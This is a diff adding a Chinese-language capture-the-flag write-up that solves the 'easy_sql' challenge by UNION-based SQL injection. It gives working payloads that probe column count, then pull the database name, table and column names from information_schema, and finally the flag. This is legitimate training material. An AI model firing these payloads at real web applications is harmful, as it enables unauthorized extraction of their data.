@@ -320,3 +320,92 @@ Php://filter/convert.base64-encode/resource=*.php的使用
 - **`substring(...,31,32)`**: 从第 31 字符开始取 32 字符
 
  两段flag进行拼接就得到flag啦
+
+# [SWPUCTF 2021 新生赛]easy_sql
+
+## 前置知识
+
+1. 数据库中的字段就是指表的一列（这个一开始真的好多sql注入题目的wp都有这个说法，但是我一开始又懒得看数据库原理的书或者那种几十个小时的视频，所以是真不理解是什么意思，导致很大程度上降低了我做web的兴趣）
+2. 数据库整体框架的一个顺序就是库-表-列
+3. 目前从解题思路来看，第一步就是先通过传参来判断sql注入类型，数字型注入、字符型注入、搜索型注入：
+
+- 数字型注入：正常输入即可，不用考虑闭合情况
+- 字符型注入：一般要使用单引号来闭合
+- 搜索型注入（暂时还没遇到，遇到再补充）
+
+为什么要进行一个类型的判断，就是sql语句貌似就是前面如果出错了的话，会执行后面的语句，也就是达到了插入恶意SQL代码的目的。
+
+​    4.SQL查询语句：
+
+- SELECT <目标列名序列> -- 需要哪些列
+   FROM <表名> [JOIN <表名> ON <连接条件>] -- 来自哪些表
+   [WHERE <行选择条件>] -- 根据什么条件
+   [GROUP BY <分组依据列>]
+   [HAVING <组选择条件>]
+   [ORDER BY <排列依据列>]
+- `database()`函数的返回值（当前数据库的名称）
+- `GROUP_CONCAT` 是一个 MySQL 特有的聚合函数，它可以将多行的值连接成一个字符串
+- `information_schema.tables` 是一个特殊的系统表，它包含了关于数据库中所有表的信息
+- --+:在SQL中，两个短横线（`--`）是一个注释的开始。这意味着在`--`之后的所有内容都将被数据库忽略。`+` 在这里可能是为了“欺骗”某些应用程序或框架，这些应用程序或框架可能会错误地解析URL查询字符串中的`+`字符为空格（虽然在这种情况下，`+`字符在注释之后，所以实际上它没有任何作用）
+
+赋值1，有回显，说明不是数字型
+
+![image-20250809221611217](nssctf1.assets/image-20250809221611217.png)
+
+加上单引号报错，是字符型
+
+![image-20250809221655898](nssctf1.assets/image-20250809221655898.png)
+
+判断字段数
+
+![image-20250809221856299](nssctf1.assets/image-20250809221856299.png)
+
+![image-20250809221928374](nssctf1.assets/image-20250809221928374.png)
+
+可知是3，接着判断回显，
+
+```sql
+?wllm=-1' union select 1,2,3--+
+```
+
+（`UNION SELECT`是SQL注入攻击中最常用的技术之一，它允许攻击者将恶意查询结果与原查询结果合并返回。）
+
+![image-20250809222241057](nssctf1.assets/image-20250809222241057.png)
+
+只要把想要回显的内容放在后面两个参数的位置就行。
+
+注意，这里需要把wllm设置为不为1的数（就是让他查不到数据就行，因为wllm=1查得到数据），不然它只会输出wllm=1查询到的数据。然后查看数据库名称
+
+```sql
+/?wllm=2'union select 1,2,database--+
+```
+
+![image-20250809222925800](nssctf1.assets/image-20250809222925800.png)
+
+得到数据库名称为test_db, 得到数据库名称就可以按顺序数据库-表-列来找flag了
+
+这里就要用到前置知识里面的group_concat函数和information_schema.tables，就是查看‘test_db’数据库下有哪些表。
+
+```sql
+/?wllm=2'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'--+
+```
+
+![image-20250809223240206](nssctf1.assets/image-20250809223240206.png)
+
+发现有两张表，我们查看一下test_tb表中含有哪些列
+
+```sql
+/?wllm=2'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+
+```
+
+![image-20250809223551250](nssctf1.assets/image-20250809223551250.png)
+
+正常回显，有id和flag两列，那这个flag里的内容应该就是我们最终所需要的答案了。我们通过select查询语句让它把flag的内容回显。
+
+```sql
+/?wllm=2'union select 1,2,flag from test_tb--+
+```
+
+![image-20250809223802027](nssctf1.assets/image-20250809223802027.png)
+
+大体框架：库-表-列
